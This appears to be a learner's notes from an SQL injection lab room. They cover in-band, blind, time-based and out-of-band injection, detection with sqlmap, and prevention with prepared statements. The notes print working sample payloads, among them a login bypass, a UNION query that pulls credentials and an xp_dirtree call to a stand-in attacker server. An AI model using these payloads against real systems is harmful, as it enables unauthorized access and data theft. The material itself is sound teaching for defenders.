# SQL Injection

SQL Injection (SQLi) is a **web application vulnerability that allows attackers to manipulate database queries executed by the server**. It occurs when **user input is included in SQL queries without proper validation or sanitization**, allowing malicious SQL statements to be executed. Because databases store sensitive information such as **user credentials, financial records, and private data**, SQL injection can lead to severe data breaches or complete application compromise. SQLi has remained one of the **most dangerous and widely exploited vulnerabilities**, consistently appearing in the **OWASP Top 10**.

---

## Databases and SQL Basics

A **database** is an organized collection of structured data that applications use to store and retrieve information. Most web applications interact with relational databases using **SQL (Structured Query Language)**.

Common databases:

- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle

Basic SQL operations include:

| Command | Purpose |
|-------|--------|
| `SELECT` | Retrieve data |
| `INSERT` | Add new data |
| `UPDATE` | Modify existing data |
| `DELETE` | Remove data |

Example SQL query:

```sql
SELECT username, password FROM users WHERE username='admin';

## How SQL Injection Occurs

Example vulnerable query:

SELECT * FROM users WHERE username='$user' AND password='$pass';

If the application does not validate input, attackers can inject SQL code.

Example malicious input:

' OR 1=1 --

Resulting query:

SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='';

Since 1=1 is always true, the authentication check may be bypassed.

>>>>>> In-Band SQL Injection

In-band SQLi occurs when the attacker receives the results of the injected query directly in the application response. This is the most common form of SQL injection.

Two main types:
Error-based SQLi
Union-based SQLi

Example payload:

' UNION SELECT username, password FROM users --

This may display database data directly in the webpage.

>>>>> Blind SQL Injection

Blind SQL injection occurs when the application does not display database errors or results, forcing attackers to infer information indirectly.
Authentication Bypass
Attackers often use SQLi to bypass login mechanisms.

Example payload: admin' OR '1'='1' --

This manipulates the login query to always return a valid user.

>>>>Boolean-Based SQL Injection

Boolean-based SQLi works by sending queries that evaluate to true or false and observing the application's response.

Example payload:
' AND 1=1 --

Application behaves normally.
' AND 1=2 --

Application behaves differently.
By comparing responses, attackers can infer database information.

>>>>> Time-Based SQL Injection

Time-based SQL injection relies on delaying database responses to determine if a query condition is true.
Example payload (MySQL):
' AND SLEEP(5) --

If the server response is delayed by 5 seconds, the injected condition is likely executed.
Example test:
' AND IF(1=1, SLEEP(5), 0) --

Attackers can extract data one character at a time using timing responses.

>>>>Out-of-Band SQL Injection

Out-of-band SQL injection occurs when attackers retrieve data using external communication channels, such as DNS or HTTP requests. This method is used when direct responses or timing attacks are not possible.

Example concept:

'; exec xp_dirtree '\\attacker-server\share' --

The database server attempts to connect to an attacker-controlled system, allowing the attacker to capture data.

>>>>>> Detecting SQL Injection

Security testers identify SQLi vulnerabilities by sending special characters and observing application behavior.

Common test inputs: " OR 1=1 --"

Tools used for testing:
Burp Suite
SQLmap
OWASP ZAP

Example automated scan with SQLmap:

sqlmap -u "http://example.com/page?id=1" --dbs

This attempts to identify injectable parameters and enumerate databases.

>>>>Security Impact

SQL injection can cause severe damage to web applications and organizations.

>>>>> Possible impacts include:
Database data theft
Authentication bypass
Data modification or deletion
Exposure of sensitive information
Full database compromise
In severe cases, SQL injection can lead to complete control over the backend database.

>>>>>> Prevention and Mitigation

Parameterized Queries (Prepared Statements)
Use prepared statements to ensure user input is treated strictly as data.

Example:
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
Input Validation
Restrict user input using allow-lists and proper validation rules.

Example:
Only allow numeric values for ID parameters
Escaping Special Characters

If dynamic queries must be used, escape special characters to prevent SQL manipulation.

Least Privilege Database Access

Applications should use database accounts with limited permissions so attackers cannot access or modify critical data.

SQL Injection occurs when unsanitized user input is used in database queries, allowing attackers to manipulate SQL commands. By exploiting SQLi vulnerabilities, attackers can access sensitive data, bypass authentication systems, or damage database integrity. Detecting SQL injection involves testing input parameters with SQL payloads, while prevention requires prepared statements, strong input validation, and secure database configurations.

Room Completed: SQL Injection
Focus Area: Web Application Security, Database Exploitation
